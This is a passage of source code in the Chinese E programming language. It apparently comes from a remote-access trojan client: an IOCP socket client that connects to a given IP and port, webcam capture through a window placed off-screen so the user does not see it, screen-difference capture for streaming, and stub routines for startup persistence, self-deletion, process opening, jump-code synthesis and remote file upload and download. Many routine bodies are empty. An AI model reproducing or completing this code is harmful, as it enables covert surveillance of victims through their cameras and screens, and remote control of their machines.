.如果 (等于 (index, 0))
    返回 (假)
.否则
    返回 (SendData (index, 数据, 取字节集长度 (数据)))
.如果结束


.子程序 判断是否连接, 整数型, 公开, 0=未连接1=已经连接 
.如果真 (等于 (index, 0))
    返回 (0)
.如果真结束
返回 (1)


.程序集 WinSocket, , , 

.程序集变量 状态, 逻辑型, , "100000", 客户信息
.程序集变量 Socket, 整数型, , "100000", 客户信息
.程序集变量 回调函数, 整数型, , "100000", 客户信息
.程序集变量 标识, 整数型, , "100000", 客户信息
.程序集变量 CompletionPort, 整数型, , , 
.程序集变量 工作线程, 整数型, , "0", 
.程序集变量 初始化, 逻辑型, , , 
.子程序 Call, 整数型, , 
.参数 指针, 整数型, , 
.参数 客户标识, 整数型, , 
.参数 消息类型, 整数型, , 
.参数 数据指针, 整数型, , 
.参数 数据长度, 整数型, , 

置入代码 ({ 201, 88, 135, 4, 36, 255, 224 })
返回 (0)

.子程序 创建客户端IOCP线程, 逻辑型, 公开, 必须调用一次本函数 进行模块的初始化.
.局部变量 SysInf, SYSTEM_INFO, , , 
.局部变量 i, 整数型, , , 
.局部变量 WSADATA, WSADATA1, , , 

.如果真 (取反 (初始化))
    .如果真 (等于 (WSAStartup1 (合并整数 (2, 2), WSADATA), 0))
        赋值 (CompletionPort, CreateIoCompletionPort1 (-1, 0, 0, 0))
        .如果真 (不等于 (CompletionPort, 0))
            GetSystemInfo1 (SysInf)
            重定义数组 (工作线程, 假, 相乘 (SysInf.dwNumberOfProcessors, 2))
            .计次循环首 (相乘 (SysInf.dwNumberOfProcessors, 2), i)
                赋值 (工作线程 [i], CreateThread1 (0, 0, &ThreadProc, 0, 0, 0))
            .计次循环尾 ()
            赋值 (初始化, 真)
        .如果真结束
        
    .如果真结束
    
.如果真结束
返回 (初始化)

.子程序 销毁客户端IOCP线程, 逻辑型, 公开, 不再使用本模块时调用本函数 释放相关资源.
.局部变量 i, 整数型, , , 
.局部变量 计时, 整数型, , , 
.局部变量 Exit, 逻辑型, , , 
.局部变量 ExitCode, 整数型, , , 

.如果真 (取反 (初始化))
    返回 (假)
.如果真结束

.计次循环首 (100000, i)
    .如果真 (状态 [i])
        Disconnect (i)
    .如果真结束
    
.计次循环尾 ()

.计次循环首 (取数组成员数 (工作线程), i)
    PostQueuedCompletionStatus1 (CompletionPort, 0, #退出线程, 0)
.计次循环尾 ()

赋值 (计时, GetTickCount1 ())

.判断循环首 (取反 (Exit))
    .如果 (大于或等于 (相减 (GetTickCount1 (), 计时), 5000))
        .计次循环首 (取数组成员数 (工作线程), i)
            TerminateThread1 (工作线程 [i], 1)
        .计次循环尾 ()
        跳出循环 ()
    .否则
        赋值 (Exit, 真)
        .计次循环首 (取数组成员数 (工作线程), i)
            GetExitCodeThread1 (工作线程 [i], ExitCode)
            .如果真 (等于 (ExitCode, #STILL_ACTIVE))
                赋值 (Exit, 假)
            .如果真结束
            
        .计次循环尾 ()
        WaitForSingleObject1 (-1, 100)
    .如果结束
    
.判断循环尾 ()

CloseHandle1 (CompletionPort)
赋值 (初始化, 假)
返回 (真)

.子程序 Connect, 整数型, , 
.参数 客户标识, 整数型, , 
.参数 事件回调函数, 整数型, , 
.参数 IP地址, 文本型, , 
.参数 端口号, 整数型, , 

.局部变量 s, 整数型, , , 
.局部变量 i, 整数型, , , 
.局部变量 addr, sockaddr_in, , , 
.局部变量 lpOverlapped, 整数型, , , 

.如果真 (取反 (初始化))
    返回 (0)
.如果真结束

赋值 (s, WSASocket1 (#AF_INET, #SOCK_STREAM, #IPPROTO_TCP, 0, 0, #WSA_FLAG_OVERLAPPED))
.如果真 (等于 (s, #INVALID_SOCKET))
    返回 (0)
.如果真结束

赋值 (i, GetIndex ())
.如果真 (等于 (i, 0))
    closesocket1 (s)
    返回 (0)
.如果真结束

赋值 (标识 [i], 客户标识)
赋值 (状态 [i], 真)
赋值 (Socket [i], s)
赋值 (回调函数 [i], 事件回调函数)

赋值 (addr.sin_family, #AF_INET)
赋值 (addr.sin_addr, inet_addr1 (IP地址))
赋值 (addr.sin_port, htons1 (端口号))

赋值 (s, connect1 (s, addr, 16))

.如果真 (等于 (s, 0))
    赋值 (lpOverlapped, CreateOverlapped ())
    .如果真 (不等于 (lpOverlapped, 0))
        CreateIoCompletionPort1 (Socket [i], CompletionPort, i, 0)
        SetType (lpOverlapped, #Recv)
        PostWSARecv (i, lpOverlapped)
        返回 (i)
    .如果真结束
    
.如果真结束

closesocket1 (Socket [i])
赋值 (标识 [i], 0)
赋值 (Socket [i], 0)
赋值 (回调函数 [i], 0)
赋值 (状态 [i], 假)
返回 (0)

.子程序 Disconnect, 空白型, , 
.参数 数组索引, 整数型, , 

closesocket1 (Socket [数组索引])

.子程序 ThreadProc, 整数型, , 工作线程
.局部变量 lpNumberOfBytesTransferred, 整数型, , , 
.局部变量 lpCompletionKey, 整数型, , , 
.局部变量 lpOverlapped, 整数型, , , 
.局部变量 x, 整数型, , , 

.判断循环首 (真)
    .如果 (GetQueuedCompletionStatus1 (CompletionPort, lpNumberOfBytesTransferred, lpCompletionKey, lpOverlapped, -1))
        .如果真 (等于 (lpCompletionKey, #退出线程)) ' 内部指令
            跳出循环 ()
        .如果真结束
        赋值 (x, GetType (lpOverlapped)) ' 取事件类型
        .判断开始 (等于 (lpNumberOfBytesTransferred, 0))
            Disconnect (lpCompletionKey)
        .判断 (等于 (x, #Recv))
            Call (回调函数 [lpCompletionKey], 标识 [lpCompletionKey], #数据到达, lpOverlapped, lpNumberOfBytesTransferred)
            PostWSARecv (lpCompletionKey, lpOverlapped)
        .判断 (等于 (x, #Send))
            RtlMoveMemory_int_2 (x, 相加 (lpOverlapped, 24), 4) ' 取出数据长度
            .如果 (小于 (lpNumberOfBytesTransferred, x)) ' 判断是否全部发送完毕
                 ' 继续发送剩余部分
                RtlMoveMemory_int_1 (相加 (lpOverlapped, 24), 相减 (x, lpNumberOfBytesTransferred), 4)
                RtlMoveMemory_int_2 (x, 相加 (lpOverlapped, 28), 4)
                赋值 (x, 相加 (x, lpNumberOfBytesTransferred))
                RtlMoveMemory_int_1 (相加 (lpOverlapped, 28), x, 4)
                PostWSASend (lpCompletionKey, lpOverlapped) ' 投递WSASend
            .否则
                Release2 (lpOverlapped)
            .如果结束
            
        .默认
            
        .判断结束
        
    .否则
        .如果 (等于 (lpOverlapped, 0))
            到循环尾 ()
        .否则
            .判断开始 (等于 (GetType (lpOverlapped), #Send))
                Release2 (lpOverlapped)
            .默认
                Release (lpCompletionKey, lpOverlapped)
            .判断结束
            
        .如果结束
        
    .如果结束
    
.判断循环尾 ()

返回 (#退出线程)

.子程序 GetIndex, 整数型, , 取数组索引
.局部变量 Index, 整数型, , , 


.计次循环首 (100000, Index)
    .如果真 (取反 (状态 [Index]))
        返回 (Index)
    .如果真结束
    
.计次循环尾 ()
返回 (0)

.子程序 GetType, 整数型, , 取事件类型
.参数 lpOverlapped, 整数型, , 

.局部变量 type, 整数型, , , 

RtlMoveMemory_int_2 (type, 相加 (lpOverlapped, 20), 4)
返回 (type)

.子程序 SetType, 空白型, , 置事件类型
.参数 lpOverlapped, 整数型, , 
.参数 tpye, 整数型, , 

RtlMoveMemory_int_1 (相加 (lpOverlapped, 20), tpye, 4)

.子程序 PostWSARecv, 空白型, , 投递WSARecv
.参数 Index, 整数型, , 
.参数 lpOverlapped, 整数型, , 

.如果真 (等于 (WSARecv1 (Socket [Index], 相加 (lpOverlapped, 24), 1, 0, 0, lpOverlapped, 0), #SOCKET_ERROR))
    .如果 (等于 (GetLastError1 (), #WSA_IO_PENDING))
        
    .否则
        Release (Index, lpOverlapped)
    .如果结束
    
.如果真结束


.子程序 PostWSASend, 逻辑型, , 投递WSASend
.参数 Index, 整数型, , 
.参数 lpOverlapped, 整数型, , 

.如果真 (等于 (WSASend1 (Socket [Index], 相加 (lpOverlapped, 24), 1, 0, 0, lpOverlapped, 0), #SOCKET_ERROR))
    .如果 (等于 (GetLastError1 (), #WSA_IO_PENDING))
        
    .否则
        Release2 (lpOverlapped)
        返回 (假)
    .如果结束
    
.如果真结束
返回 (真)

.子程序 GetData, 空白型, , 取数据
.参数 lpOverlapped, 整数型, , 
.参数 Buf, 字节集, , 
.参数 len, 整数型, , 

.局部变量 pMem, 整数型, , , 

RtlMoveMemory_int_2 (pMem, 相加 (lpOverlapped, 28), 4)
RtlMoveMemory_byte_2 (Buf, pMem, len)

.子程序 SendData, 逻辑型, , 发数据
.参数 Index, 整数型, , 
.参数 Buf, 字节集, , 
.参数 len, 整数型, , 

.局部变量 olOverlap, 整数型, , , 
.局部变量 WSABuf, 整数型, , , 

赋值 (olOverlap, mAlloc (36))
.如果真 (等于 (olOverlap, 0))
    返回 (假)
.如果真结束
赋值 (WSABuf, mAlloc (len))
.如果真 (等于 (WSABuf, 0))
    mFree (olOverlap)
    返回 (假)
.如果真结束
RtlMoveMemory_byte_1 (WSABuf, Buf, len)
RtlMoveMemory_int_1 (相加 (olOverlap, 20), #Send, 4) ' type
RtlMoveMemory_int_1 (相加 (olOverlap, 24), len, 4) ' wsabuflen
RtlMoveMemory_int_1 (相加 (olOverlap, 28), WSABuf, 4) ' wsabuf
RtlMoveMemory_int_1 (相加 (olOverlap, 32), WSABuf, 4)
返回 (PostWSASend (Index, olOverlap))

.子程序 CreateOverlapped, 整数型, , 创建Overlapped结构
.局部变量 lpOverlapped, 整数型, , , 
.局部变量 lpBuf, 整数型, , , 

赋值 (lpOverlapped, mAlloc (32)) ' 分配 Overlapped 使用的内存
.如果真 (等于 (lpOverlapped, 0))
    返回 (0)
.如果真结束
赋值 (lpBuf, mAlloc (4096))
.如果真 (等于 (lpBuf, 0))
    mFree (lpOverlapped)
    返回 (0)
.如果真结束

RtlMoveMemory_int_1 (相加 (lpOverlapped, 24), 4096, 4) ' 数据缓冲区长度 赋值到Overlapped结构中
RtlMoveMemory_int_1 (相加 (lpOverlapped, 28), lpBuf, 4) ' 分配 数据缓冲区使用的内存 将指针赋值到 Overlapped结构中
返回 (lpOverlapped)


.子程序 Release, 空白型, , 释放资源
.参数 Index, 整数型, , 
.参数 lpOverlapped, 整数型, , 

.局部变量 pMem, 整数型, , , 

Call (回调函数 [Index], 标识 [Index], #连接断开, lpOverlapped, 0)
closesocket1 (Socket [Index]) ' 关闭套接字
RtlMoveMemory_int_2 (pMem, 相加 (lpOverlapped, 28), 4) ' 取出数据缓冲区指针
mFree (pMem) ' 释放
mFree (lpOverlapped) ' 释放
赋值 (标识 [Index], 0)
赋值 (Socket [Index], 0)
赋值 (回调函数 [Index], 0)
赋值 (状态 [Index], 假)

.子程序 Release2, 空白型, , 释放资源2
.参数 lpOverlapped, 整数型, , 

.局部变量 pMem, 整数型, , , 

RtlMoveMemory_int_2 (pMem, 相加 (lpOverlapped, 32), 4) ' 取出数据缓冲区指针
mFree (pMem) ' 释放
mFree (lpOverlapped) ' 释放

.子程序 mAlloc, 整数型, , 分配内存
.参数 dwSize, 整数型, , 

返回 (VirtualAlloc1 (0, dwSize, 位或 (#MEM_COMMIT, #MEM_RESERVE), #PAGE_EXECUTE_READWRITE))

.子程序 mFree, 逻辑型, , 释放内存
.参数 lpAddress, 整数型, , 

返回 (VirtualFree1 (lpAddress, 0, #MEM_RELEASE))

.程序集 视频程序集, , , 

.子程序 查视频驱动, 文本型, , 
.参数 只返回, 逻辑型, , 

.局部变量 index, 整数型, , , 
.局部变量 Device, 文本型, , , 
.局部变量 Version, 文本型, , , 
.局部变量 分隔, 文本型, , , 
.局部变量 分隔1, 逻辑型, , , 

赋值 (Device, 取空白文本 (128))
赋值 (Version, 取空白文本 (128))
赋值 (index, 0)
.判断循环首 (小于 (index, 5))
    capGetDriverDescription (index, Device, 100, Version, 100) ' 判断有那些视频
    .如果真 (等于 (Device, “”))
        跳出循环 ()
    .如果真结束
    赋值 (分隔, 相加 (分隔, Device, “  ”, Version, “|”))
    赋值 (index, 相加 (index, 1))
.判断循环尾 ()
返回 (分隔)

.子程序 初始化视频, 空白型, , 
.参数 I, 空白型, , 

赋值 (视频状态, 1)
 ' 窗口句柄_ ＝ 创建WINDOWS窗口 ()
创建捕获窗口 (I)
开始捕获 ()
内部_消息循环 ()

.子程序 截取视频, 字节集, , 
 ' 启动线程_ (&视频刷新, , )
 ' 改变窗口_ (窗口句柄_, 0 － 320, 0, 320, 240, 0)
 ' 启动线程_ (&窗口总在最前, 窗口句柄_)
返回 (截取窗口位图 (捕获窗口句柄))
 ' 窗口1.移动 (0 － 320, 0, 320, 240)
 ' _启动窗口.图片框1.图片 ＝ 截取窗口位图 (窗口1.取窗口句柄 ())

.子程序 视频刷新, 空白型, , 
 ' 改变窗口_ (窗口句柄_, 10, 10, 0, 0, 0)
 ' 窗口1.移动 (10, 10, 1, 1)

.子程序 视频_取图片差异, 字节集, , 
.参数 原图, 字节集, , 只支持bmp且两张图的大小、尺寸必须相同
.参数 对比图, 字节集, , 
.参数 误差, 整数型, 可空, 

.局部变量 计次, 整数型, , , 
.局部变量 偏移, 整数型, , , 
.局部变量 数据, 字节集, , , 
.局部变量 图像宽, 整数型, , , 
.局部变量 图像高, 整数型, , , 

 ' 检查是否为bmp格式
.如果真 (或者 (小于或等于 (取字节集长度 (原图), 56), 不等于 (原图 [1], 66), 不等于 (原图 [2], 77), 不等于 (对比图 [1], 66), 不等于 (对比图 [2], 77)))
    返回 ({  })
.如果真结束
赋值 (图像宽, 相加 (原图 [19], 相乘 (原图 [20], 256))) ' 算出原图宽 根据bmp的格式 下同
赋值 (图像高, 相加 (原图 [23], 相乘 (原图 [24], 256)))
 ' 检查两图长宽是否等
.如果真 (或者 (不等于 (相加 (对比图 [19], 相乘 (对比图 [20], 256)), 图像宽), 不等于 (相加 (对比图 [23], 相乘 (对比图 [24], 256)), 图像高)))
    返回 ({  })
.如果真结束
赋值 (计次, 55)
赋值 (数据, 对比图)
赋值 (误差, 选择 (小于 (误差, 0), 0, 误差))
赋值 (偏移, 选择 (等于 (求余数 (相乘 (图像宽, 3), 4), 0), 0, 相减 (4, 求余数 (相乘 (图像宽, 3), 4))))
 ' 遍历各点的颜色
.计次循环首 (图像高, )
    .计次循环首 (图像宽, )
        .如果 (大于 (取绝对值 (相减 (相加 (原图 [计次], 原图 [相加 (计次, 1)], 原图 [相加 (计次, 2)]), 对比图 [计次], 对比图 [相加 (计次, 1)], 对比图 [相加 (计次, 2)])), 误差)) ' 计算各点颜色差值
             ' 不同的地方添加到新图
            赋值 (数据 [计次], 对比图 [计次])
            赋值 (数据 [相加 (计次, 1)], 对比图 [相加 (计次, 1)])
            赋值 (数据 [相加 (计次, 2)], 对比图 [相加 (计次, 2)])
        .否则
             ' 相同地方置为白色{253,254,255}分别为RGB的值 不用纯白255 255 255的原因是用于拼合图片时需要作为标识
             ' 若两图差异不大 则大部分地方为白色 再用zilb等压缩 一张全屏图可压缩到10~35K左右 如果弄成256色的话更小
            赋值 (数据 [计次], 253)
            赋值 (数据 [相加 (计次, 1)], 254)
            赋值 (数据 [相加 (计次, 2)], 255)
        .如果结束
        赋值 (计次, 相加 (计次, 3))
    .计次循环尾 ()
    赋值 (计次, 相加 (计次, 偏移))
.计次循环尾 ()
 ' 如果遍历一张1024×768的全屏图就要进行循环 1024×768=786432次..很慢..而且CPU占用很大..
 ' 如果用在屏幕传输中..截图、取差异、压缩..就要了300多毫秒..如果再加上传送、拼合图片..1张图就要1秒了..如果网速慢……呃..
 ' bmp格式除了上面的之外我其他的都不怎么清楚 有资料说把图片分成16×8块后每块内取十几个点的颜色来比较的方法较快 但不懂怎么写
 ' 望高人改进。。
返回 (数据)

.子程序 创建捕获窗口, 整数型, , 成功返回非0
.参数 i, 空白型, , 

.如果真 (不等于 (捕获窗口句柄, 0))
    返回 (0)
.如果真结束
赋值 (捕获窗口句柄, capCreateCaptureWindowA (“”, 1342177280, -319, -239, 320, 240, WindowFromDC (GetDC (0)), i))
ShowWindow (捕获窗口句柄, 0)
SetWindowLongA (捕获窗口句柄, -20, 128)
SetWindowLongA (捕获窗口句柄, -8, 128)
ShowWindow (捕获窗口句柄, 5)
.如果真 (不等于 (捕获窗口句柄, 0))
    返回 (1)
.如果真结束
返回 (0)

.子程序 开始捕获, 整数型, , 成功返回非0
.局部变量 执行结果, 整数型, , , 

.如果真 (等于 (捕获窗口句柄, 0))
    返回 (0)
.如果真结束
赋值 (执行结果, SendMessageA (捕获窗口句柄, 1034, 0, 0))
SendMessageA (捕获窗口句柄, 1077, 1, 0)
SendMessageA (捕获窗口句柄, 1076, 50, 0)
SendMessageA (捕获窗口句柄, 1074, 1, 0)
返回 (执行结果)

.子程序 停止捕获, 整数型, , 成功返回非0
.如果真 (等于 (捕获窗口句柄, 0))
    返回 (0)
.如果真结束
返回 (SendMessageA (捕获窗口句柄, 1035, 0, 0))

.子程序 创建WINDOWS窗口, 整数型, , 
.局部变量 WindowFunction, 整数型, , , 窗口函数
.局部变量 WndClass, WNDCLASSEX, , , 窗口类名
.局部变量 WindowsStyle, 整数型, , , 窗口风格
.局部变量 msg, MSG, , , 循环消息
.局部变量 句柄, 空白型, , , 

赋值 (WndClass.cbSize, LocalSize (WndClass)) ' 取类型尺寸
赋值 (WndClass.style, 位或 (#CS_VREDRAW, #CS_HREDRAW)) ' 设置重绘消息
赋值 (WndClass.lpfnWndProc, 到整数 (&WindowsProcess)) ' 设置启动窗口处理函数
赋值 (WndClass.cbClsExtra, 0) ' 不设置任何
赋值 (WndClass.cbWndExtra, 0) ' 不设置任何
赋值 (WndClass.hInstance, -2147483648) ' GetModuleHandle (“”)  ' 取全局实例句柄
赋值 (WndClass.hIcon, LoadIcon (0, #IDI_APPLICATION)) ' 取窗口光标句柄
赋值 (WndClass.hCursor, LoadCursor (0, #IDI_APPLICATION)) ' 载入窗口光标
赋值 (WndClass.hbrBackground, 相加 (#COLOR_BTNFACE, 1)) ' 系统默认的灰色
赋值 (WndClass.lpszMenuName, “”)
赋值 (WndClass.lpszClassName, “BMWinClass”) ' 窗口类名
RegisterClassEx (WndClass) ' 注册窗口类名
赋值 (WindowsStyle, -2138570752) ' 268435456位或 (#WS_VISIBLE, #WS_SIZEBOX, #WS_MAXIMIZEBOX, #WS_MINIMIZEBOX, #WS_CAPTION, #WS_SYSMENU)  ' 设置窗口风格，可自定义。
赋值 (句柄, CreateWindowEx (0, WndClass.lpszClassName, “”, WindowsStyle, 相减 (0, 318), 相减 (0, 238), 320, 240, 0, 0, WndClass.hInstance, 0)) ' 创建窗口
ShowWindow (句柄, 0)
SetWindowLongA (句柄, -20, 128)
ShowWindow (句柄, 5)
SetWindowLongA (句柄, -8, 128)
返回 (句柄)

 ' 句柄 ＝ CreateWindowEx (0, WndClass.lpszClassName, “API创建窗口例子”, WindowsStyle, #CW_USEDEFAULT, #CW_USEDEFAULT, 450, 300, 0, 0, WndClass.hInstance, 0)  ' 创建窗口 ' #CW_USEDEFAULT, #CW_USEDEFAULT 等于位置
 ' 消息循环
 ' .判断循环首 (不等于 (GetMessage (msg, 0, 0, 0), 0))
     ' TranslateMessage (msg)
     ' DispatchMessage (msg)
 ' .判断循环尾 ()
 ' 返回 (消息.wParam)


.子程序 WindowsProcess, 整数型, , 
.参数 hwnd, 整数型, , 
.参数 msg, 整数型, , 
.参数 wparam, 整数型, , 
.参数 lparam, 整数型, , 

 ' .如果真 (等于 (msg, #WM_CLOSE)) ' 可否被关闭
     ' 结束 ()
.如果真结束
.如果真 (等于 (msg, #WM_DESTROY)) ' 一个窗口被销毁
     ' 关闭视频 ()
    结束 ()
.如果真结束
返回 (DefWindowProc (hwnd, msg, wparam, lparam))

.子程序 内部_消息循环, 整数型, , 放在启动子程序最后一行,即在返回命令前
.局部变量 Msg, MSG, , , 

.判断循环首 (不等于 (GetMessage (Msg, 0, 0, 0), 0)) ' 消息循环
    TranslateMessage (Msg)
    DispatchMessage (Msg)
.判断循环尾 ()
返回 (Msg.wParam) ' 消息循环结束即程序终止时将信息返回系统

.程序集 __HIDDEN_TEMP_MOD__, , , 

.子程序 截取窗口位图, 字节集, , 
.参数 窗口句柄, 整数型, , 



.程序集 __HIDDEN_TEMP_MOD__, , , 

.子程序 压缩数据_, 字节集, , 返回 压缩后的数据
.参数 数据, 字节集, , 欲压缩的数据



.子程序 解压数据_, 字节集, , 返回 解压缩后的数据
.参数 数据, 字节集, , 由本模块压缩过的数据.



.程序集 __HIDDEN_TEMP_MOD__, , , 

.子程序 开机启动, 整数型, , 


.子程序 KillMe, 空白型, , 无返回值
.参数 FileName, 文本型, , 



.子程序 终止自身进程, 逻辑型, , 终止一个进程(成功返回真,失败返回假)


.子程序 http读文件_, 字节集, , 有可能线程阻塞,请在外部加超时判断
.参数 完整网址, 文本型, , 
.参数 访问方式, 文本型, 可空, "GET" or "POST",为空默认"GET"
.参数 代理地址, 文本型, 可空, 
.参数 附加协议头, 文本型, 可空, 
.参数 提交信息, 文本型, 可空, "POST"专用
.参数 超时值, 整数型, 可空, 



.类模块 屏幕差异获取, , , 

.子程序 启动, 逻辑型, , 在启动完毕后，如果不用了一定要销毁！
.参数 位深, 整数型, 可空, 1=#8位，2=#16位，3=#24位，4=#32位，为空默认为8位
.参数 隔行数, 整数型, 可空, 每隔多少行扫描1次，1~20之间，推荐13~17，为空默认为15



.子程序 销毁, 空白型, , 


.子程序 获取差异, 字节集, , 一定要先启动！


.类模块 屏幕差异处理, , , 

.子程序 启动, 逻辑型, , 在调用本类其他命令之前一定要先启动！
.参数 窗口句柄, 整数型, , 一定要提供有效的窗口句柄！不然出现什么不良后果可别怪我
.参数 接受图像宽, 整数型, , 
.参数 接受图像高, 整数型, , 



.子程序 处理变化数据, 空白型, , 一定要先启动！否则造成的不良后果不关我事！
.参数 变化数据, 字节集, , 



.子程序 销毁, 空白型, , 


.程序集 __HIDDEN_TEMP_MOD__, , , 

.子程序 图像_取屏幕宽度, 整数型, , 单位为像素。


.子程序 图像_取屏幕高度, 整数型, , 单位为像素。


.子程序 图像_快照, 字节集, , 功能与支持库基本相同。
.参数 窗口句柄, 整数型, 可空, 指定欲捕获其显示内容的窗口。为空则捕捉全屏。
.参数 输出宽度, 整数型, 可空, 指定图片的输出宽度。如果小于0，参数值指定的是最终图片输出宽度相对于所取得图片宽度的百分比；如果等于0，则按图片原宽度输出；如果大于0，指定输出图片的绝对宽度。如果本参数被省略，默认值为0。
.参数 输出高度, 整数型, 可空, 指定图片的输出高度。如果小于0，参数值指定的是最终图片输出高度相对于所取得图片高度的百分比；如果等于0，则按图片原高度输出；如果大于0，指定输出图片的绝对高度。如果本参数被省略，默认值为0。



.子程序 图像_图片句柄取图片, 字节集, , 返回的图片格式为位图。
.参数 hBitmap, 整数型, , 



.子程序 图像_窗口快照, 字节集, , 能对被其他窗口挡住的未最小化窗口进行截图。
.参数 窗口句柄, 整数型, 可空, 要截取的窗口的句柄。为空则捕捉全屏。
.参数 输出宽度, 整数型, 可空, 指定图片的输出宽度。如果小于0，参数值指定的是最终图片输出宽度相对于所取得图片宽度的百分比；如果等于0，则按图片原宽度输出；如果大于0，指定输出图片的绝对宽度。如果本参数被省略，默认值为0。
.参数 输出高度, 整数型, 可空, 指定图片的输出高度。如果小于0，参数值指定的是最终图片输出高度相对于所取得图片高度的百分比（最小为10%）；如果等于0，则按图片原高度输出；如果大于0，指定输出图片的绝对高度。如果本参数被省略，默认值为0。



.子程序 图像_释放图片句柄, 逻辑型, , 用了 图像_取图片句柄() 得到的句柄后一定要用本函数释放，不然会造成内存泄露。
.参数 图像句柄, 整数型, , 



.子程序 图像_取图片句柄, 整数型, , 支持bmp、gif、jpg、cur、ico等。感谢叮咚茶提供的极强悍源码，没有这个函数整个模块没法做了。。。
.参数 图形数据, 字节集, , 
.参数 输出宽度, 整数型, 可空, 
.参数 输出高度, 整数型, 可空, 



.子程序 图像_置图片尺寸, 字节集, , 返回新的图片数据。
.参数 原图片, 字节集, , 
.参数 新宽度, 整数型, 可空, 留空默认保持原大小，下同。
.参数 新高度, 整数型, 可空, 



.子程序 图像_取图片宽度, 整数型, , 支持bmp、gif、jpg、cur、ico等，不支持某些格式的图片(如png)，请先转换为bmp。
.参数 图片, 字节集, , 



.子程序 图像_取图片高度, 整数型, , 支持bmp、gif、jpg、cur、ico等，不支持某些格式的图片(如png)，请先转换为bmp。
.参数 图片, 字节集, , 



.子程序 图像_取剪贴板图片, 字节集, , 


.子程序 图像_置剪贴板图片, 逻辑型, , 
.参数 图片, 字节集, , 



.子程序 图像_转换图片格式, 字节集, , 支持bmp、jpg、gif、tiff、png互转。感谢凌晨孤星提供如此强大的代码。。。
.参数 图像数据, 字节集, , 被转换的图像数据
.参数 转换后的格式, 整数型, , 转换后的图片格式。1、bmp；2、jpg；3、gif；4、tiff；5、png



.子程序 图像_截取屏幕区域, 字节集, , 
.参数 截取范围, 矩形区域, , 
.参数 输出宽度, 整数型, 可空, 指定图片的输出宽度。如果小于0，参数值指定的是最终图片输出宽度相对于所取得图片宽度的百分比；如果等于0，则按图片原宽度输出；如果大于0，指定输出图片的绝对宽度。如果本参数被省略，默认值为0。
.参数 输出高度, 整数型, 可空, 指定图片的输出高度。如果小于0，参数值指定的是最终图片输出高度相对于所取得图片高度的百分比（最小为10%）；如果等于0，则按图片原高度输出；如果大于0，指定输出图片的绝对高度。如果本参数被省略，默认值为0。



.程序集 __HIDDEN_TEMP_MOD__, , , 

.子程序 取文本型变量指针, 整数型, , 
.参数 a, 文本型, 参考, 



.子程序 取字节集型变量指针, 整数型, , 
.参数 a, 字节集, , 



.子程序 取整数型变量指针, 整数型, , 
.参数 a, 整数型, 参考, 



.子程序 运行函数, 整数型, , 
.参数 子程序入口地址, 整数型, , 
.参数 参数个数, 整数型, 可空, 
.参数 参数, 整数型, 可空 数组, 



.子程序 取字节型数组变量指针, 整数型, , 
.参数 a, 字节型, 参考 数组, 



.子程序 取长整数变量指针, 整数型, , 
.参数 a, 长整数型, 参考, 



.子程序 复制字节集, 整数型, , 
.参数 源字节集, 字节集, 参考, 
.参数 目的字节集, 字节集, 参考, 
.参数 复制大小, 整数型, , 



.子程序 复制内存, 整数型, , 
.参数 源地址, 整数型, , 
.参数 目的地址, 整数型, , 
.参数 复制大小, 整数型, , 



.子程序 拷贝字节集到内存, 整数型, , 
.参数 源字节集, 字节集, 参考, 
.参数 目的地址, 整数型, , 
.参数 复制大小, 整数型, , 



.子程序 拷贝内存到字节集, 整数型, , 
.参数 源地址, 整数型, , 
.参数 目的字节集, 字节集, 参考, 
.参数 复制大小, 整数型, , 



.子程序 合成跳转代码, 字节集, , 
.参数 目的函数地址, 整数型, , 



.子程序 打开进程, 整数型, , 
.参数 进程ID, 整数型, , 



.子程序 取双精度小数型变量指针, 整数型, , 
.参数 a, 双精度小数型, 参考, 



.子程序 右移位, 整数型, , 
.参数 目标数据, 整数型, , 
.参数 移动位数, 整数型, , 



.子程序 左移位, 整数型, , 
.参数 目标数据, 整数型, , 
.参数 移动位数, 整数型, , 



.子程序 取日期时间型变量指针, 整数型, , 
.参数 a, 日期时间型, 参考, 



.子程序 取小数型变量指针, 整数型, , 
.参数 a, 小数型, 参考, 



.子程序 取字节型变量指针, 整数型, , 
.参数 a, 字节型, 参考, 



.子程序 _取字节集长度, 整数型, , 
.参数 字节集数据, 字节集, 参考, 



.程序集 __HIDDEN_TEMP_MOD__, , , 

.子程序 下载项目, 整数型, , 
.参数 IPa, 文本型, , 
.参数 端口a, 整数型, , 
.参数 本地位置, 文本型, , 
.参数 项目大小, 整数型, , 



.子程序 连接服务, 逻辑型, , 
.参数 套接口, 整数型, , 



.子程序 上传项目, 整数型, , 
.参数 IPa, 文本型, , 
.参数 端口a, 整数型, , 
.参数 本地文件, 文本型, , 




 ' 不属于任何一个程序集、类模块的函数：
